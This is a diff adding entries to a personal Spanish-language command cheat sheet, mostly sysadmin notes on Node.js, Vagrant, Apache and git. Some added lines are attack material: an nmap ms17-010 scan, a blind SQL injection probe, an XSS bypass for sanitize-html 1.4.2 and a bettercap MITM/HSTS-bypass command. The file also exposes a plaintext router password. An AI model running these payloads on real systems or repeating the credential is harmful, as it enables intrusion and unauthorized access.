@@ -37,6 +37,12 @@ vim /usr/local/etc/php-fpm.conf //no lo hice, no encuentro esa parte
   group = www-data
 
 
+https://nodeschool.io/es/#workshoppers //#nodejs
+npm install -g learnyounode				//#nodejs
+learnyounode							//#nodejs
+node programa //ejecutar				//#nodejs
+
+
 
 grep -i 'virtualbox\|git' cmds //o grep -ie 'virtualbox|git' cmds // uso de grep para dos palabras distintas
 sudo netstat -panel | grep -ve  '80' | grep -ve '443' //escuchando puertos que no sean 443 ni 80
@@ -79,7 +85,51 @@ sudo apt-get install mysql-server //#laravel, #mysql instalacion
 mysql -uroot -p //#laravel, #mysql, create database blog, use blog, luego modificar el archivo .env con esos parametros
 
 
+
 tail -f /var/log/apache2/error.log //error log apache2
 sudo a2enmod proxy_fcgi setenvif & sudo a2enconf php7.0-fpm & sudo service apache2 restart //php7 en apache2 
 sudo apt-get install php-mbstring // apache, problemas con utf-8 mbstring 
 sudo apt-get install php7.0-xml // error 500, Uncaught Error: Call to undefined function utf8_decode() in ..
+
+
+ll | wc -l // contar las lineas de (ls -la)
+ll | wc -w // contar la cantidad de palabras (ls -la)
+
+nmap -script /usr/share/nmap/scripts/smb-vuln-ms17-010.nse –script-args=unsafe=1 -p445 192.168.1.45 // smb ms17 vul windows 7 
+nmap -script /usr/share/nmap/scripts/smb-vuln-ms17-010.nse –script-args=unsafe=1 -p445 192.168.1.42 // smb ms17 vul windows 7 
+vagrant init wyeworks/workshop-ruby-on-rails-2017 //#instalacion #vagrant
+vagrant ssh //entrar a maquina virtual vagrant
+sudo find / -name vagrant //encontrar todos los archivos con nombre vagrant
+admin/5DhD64Je // pass router zte f660
+
+python -m SimpleHTTPServer 8000 // simple http server python 
+id=1 and SLEEP(5) // comprobar blind sql injection
+wp-content vulnerabilidad wordpress versiones viejas // mirar reydes https://www.youtube.com/watch?v=D4WTE2ZQYqo min 50 aprox 
+php-cgi ejecucion remota de codigo , versiones viejas // mirar reydes https://www.youtube.com/watch?v=D4WTE2ZQYqo min 19 aprox 
+server side includes (SSI injection) Injection, archivos con extesiones shtml,stm, shtm  // #inyeccion sql SSIi mirar reydes https://www.youtube.com/watch?v=D4WTE2ZQYqo min 15 aprox 
+
+
+tc -s qdisc ls dev eth1 | grep -o 'Sent [0-9]*' //muestra solo lo que matchea
+crontab -e --> 00 8,9,10 * * * /home/jalvez/alertaCambiaPag/paginaModificada.sh // crontab a las 8,9,10 todos los dias, crontab -l lista 
+env -i /home/jalvez/alertaCambiaPag/paginaModificada.sh //probar crontab
+vagrant provision //si se edita Vagrantfile o Cheffile #ruby on rails
+git remote add origin git@bitbucket.org:<username>/hello_app.git
+ git push -u origin --all //agregar repositorio remoto y pushear
+
+
+bypass sanitize-html.js 1.4.2, <<script>alert(XSS2)</script>script>alert(XSS2)<<script>alert(XSS2)</script>/script> con algun enter //#nodejs libreria sanitize #minify 
+
+
+
+apt-get install linux-headers-amd64 //kali guest-additions 1
+apt-get install linux-image-4.9.0-kali4-amd64 //kali guest-additions 2
+reboot //kali guest-additions 3
+apt-get install virtualbox-guest-x11 -y //kali guest additions 4
+
+bettercap -I wlan0 -T 192.168.1.42  --no-discovery --proxy --proxy-port 80 --proxy-https --proxy-https-port 443 -P POST --use-mac CC:1A:FA:71:91:82 //hsts bypass
+
+
+https://www.virustotal.com/ //#information_gathering, #dominios, #domains #subdominios
+
+Netlogon Service (NP-In) // regla que bloquea psexec windows 10
+
